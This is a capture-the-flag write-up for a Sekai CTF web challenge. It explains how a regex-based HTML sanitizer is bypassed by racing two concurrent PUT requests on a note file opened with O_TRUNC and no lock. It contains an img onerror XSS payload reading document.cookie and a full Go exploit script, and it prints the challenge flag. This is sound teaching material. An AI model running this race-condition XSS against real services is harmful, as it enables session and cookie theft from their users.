---
title: "&lt;_w+ Write-Up"
date: 2026-07-09
categories: ["CTF", "Write-Up"]
tags: ["Sekai", "CTF", "Web", "Race Condition"]
summary: "Analysis and write-up of `&`lt;_w+, a Web challenge from 2026 Sekai CTF"
---

## Intro

Hello!

I recently took part in 2026 Sekai CTF and got to experience a number of challenges.<br>
Today, I'd like to analyze one of the challenges that was given in the Web category.

The instance is currently down, so I'll spin up the server from the provided local files and work through the solution!
<br> <br>

---

## 00_Challenge Description

``` json
{
  "Title": "&lt;_w+",
  "Description": "HTML unescape + Regex to delete all = What can I do?"
}
```

First, let's read the challenge.

Maybe it only looks obvious after solving it, but the **Description** gives away a lot of hints. <br>
From `HTML unescape` and the `&lt` in the challenge title, I get the feeling there's a step that turns **HTML entities back into real characters**.

Also, from `Regex to delete all`, it seems the server isn't safely handling HTML tags with a parser, but rather stripping them with a **regular expression**.

Let's spin up the server and take a look ourselves.
<br> <br>

---

## 01_Analyzing the Challenge Server and Code

After starting the server and visiting localhost:8080, you can see something like the following.

<img src="/img/posts/sekai_web_ltw_main.png" width="500">

Since it says `XSS Challenge!` at the top, <br>
`'Ah, so this must be an XSS vuln challenge~'`<br>
is the thought that comes to mind.

For a closer analysis, let's check the source code.
<br> <br>

### 01-1_Analyzing the sanitizer() Function

The core of the server code is `sanitizer()`.

```go
func sanitizer(msg string) (string, error) {
	if len(msg) > 128 {
		return "", fmt.Errorf("too long message")
	}

	if utf8.ValidString(msg) == false {
		return "", fmt.Errorf("invalid character")
	}

	sanitized := bluemonday.StrictPolicy().Sanitize(msg)

	sanitized = strings.ReplaceAll(sanitized, "&lt;", "<")
	sanitized = strings.ReplaceAll(sanitized, "&gt;", ">")
	var reHTML = regexp.MustCompile(`<(/)?\w+`)

	sanitized = reHTML.ReplaceAllString(sanitized, "")

	return sanitized, nil
}
```
<br>

The function's data-processing order can be summarized as follows.
```markdown
1. Check that the input length is 128 bytes or less.
2. Check that it is a valid UTF-8 string.
3. Sanitize the HTML with bluemonday.StrictPolicy().
4. Replace &lt; with <.
5. Replace &gt; with >.
6. Delete whatever matches the regex <(/)?\w+.
```

The final regex deletes patterns where a word character follows `<`.<br>
So tag openings like `<script` / `img` / `<svg` end up being removed.

For this reason, trying to exploit with a naive XSS payload will fail.<br>
Let me help with an example!
<br> <br>


Let's assume we submit a payload like the one below.
```html
&lt;img src=x onerror=console.log(document.cookie)&gt;
```

Then, along the way, `&lt;` and `&gt;` get turned into `<` and `>`, resulting in something like this.
```html
<img src=x onerror=console.log(document.cookie)>
```

But in the end, the regex deletes the `<img` part, leaving only a broken string like this!
```html
 src=x onerror=console.log(document.cookie)>
```

Since this isn't a tag, the JS won't execute.<br>
At first, you end up puzzling over how to bypass the regex filter, and start going down rabbit holes..

But the real vulnerability lies in the `PUT /notes/{id}` part that edits a note.
<br>
<br>

### 01-2_Analyzing the PUT /notes/{id} Logic

```go
f, err := os.OpenFile(filePath, os.O_WRONLY|os.O_TRUNC, 0644)
...
f.Write([]byte(sanitized))
```

The code above is the note-editing logic. I've omitted part of the middle!<br>
The most important part here, `O_TRUNC`, wipes the entire existing file content the moment the file is opened.
<br><br>

Let's work out how note editing behaves.
```markdown
1. Open the file.
2. Because of O_TRUNC, the existing file content is wiped.
3. Write the sanitized string.
```

The key point is that there is no File Lock during this process.<br>
If two `PUT` requests come in at the same time for the same note, each request's `O_TRUNC` and `Write()` can interleave with one another.<br>
As a result, even though each input **passed the sanitizer normally**, the **final file can end up storing HTML that the sanitizer never actually produced**!

<br>

---

## 02_Exploit Ideation

Let's design an exploit based on the vulnerability we've found so far.<br>

First, the payload we want to build is as follows.

```html
<img src=x onerror=console.log(document.cookie)>
```

If we submit it as-is, `<img` gets deleted by the regex, so I split the payload into two.

```text
p1 = <
p2 = *img src=x onerror=console.log(document.cookie)>
```
<br>

On their own, `p1` and `p2` aren't dangerous, but going through the race ordering below makes the exploit possible.

```markdown
1. The p1 request opens the file.
   Because of O_TRUNC, the file is emptied.

2. The p2 request opens the file.
   Again, because of O_TRUNC, the file is emptied.

3. The p2 request writes its long string.
   File content:
   *img src=x onerror=console.log(document.cookie)>

4. The p1 request writes the single character < at its own file offset 0.
```

Through this process, the first character `*` that p2 wrote gets overwritten by p1's `<`.<br>
In the end, this produces the
```html
<img src=x onerror=console.log(document.cookie)>
```
HTML tag we wanted!

<br>

---

## 03_Exploit

> The exploit code attached to this post is a version cleaned up to use `console.log(document.cookie)` to fit the admin-bot environment!

The exploit I wrote based on the analysis is as follows!

<details>
<summary>Exploit Code</summary>

```go
package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

const (
	baseURL = "http://localhost:8080"
)

func createNote(message string) (string, error) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.PostForm(baseURL+"/create", url.Values{"message": {message}})
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to create note: %s", string(body))
	}

	location := resp.Header.Get("Location")
	id := strings.TrimPrefix(location, "/notes/")
	return id, nil
}

func updateNote(id, message string) error {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	form := url.Values{"message": {message}}
	req, err := http.NewRequest(
		"PUT",
		fmt.Sprintf("%s/notes/%s", baseURL, id),
		strings.NewReader(form.Encode()),
	)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusSeeOther {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to update note: %s", string(body))
	}

	return nil
}

func getNote(id string) (string, error) {
	resp, err := http.Get(fmt.Sprintf("%s/notes/%s", baseURL, id))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("failed to get note: %s", string(body))
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

func main() {
	payload := "<img src=x onerror=console.log(document.cookie)>"

	p1 := "<"
	p2 := "*" + payload[1:]

	id, err := createNote("foo")
	if err != nil {
		fmt.Println("create error:", err)
		return
	}

	fmt.Println("note id:", id)
	fmt.Println("url:", fmt.Sprintf("%s/notes/%s", baseURL, id))

	for {
		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			if err := updateNote(id, p2); err != nil {
				fmt.Println("update p2 error:", err)
			}
		}()

		go func() {
			defer wg.Done()
			if err := updateNote(id, p1); err != nil {
				fmt.Println("update p1 error:", err)
			}
		}()

		wg.Wait()

		content, err := getNote(id)
		if err != nil {
			fmt.Println("get error:", err)
			return
		}

		fmt.Println("now:", content)

		if content == payload {
			fmt.Println("pwned!", content)
			fmt.Println("Report this ID:", id)
			fmt.Println("URL:", fmt.Sprintf("%s/notes/%s", baseURL, id))
			return
		}

		time.Sleep(50 * time.Millisecond)
	}
}
```

</details>

In the actual competition, I was ultimately able to obtain the FLAG `SEKAI{l0g1c_l1v3s_1n_c0d3..._vuln_l1v3s_1n_t1m3!}`.

<br>

---

## 04_Outro

The challenge I analyzed today isn't all that hard, but it still offers good takeaways.<br>

At first glance you think `do I have to use XSS?`, but it turns out to be a Race Condition challenge that abuses the lack of a File Lock — which I found fun!!
<br><br>

Next time, I'll take some time to analyze and review a harder Web challenge.

Thanks for reading🤭🤭
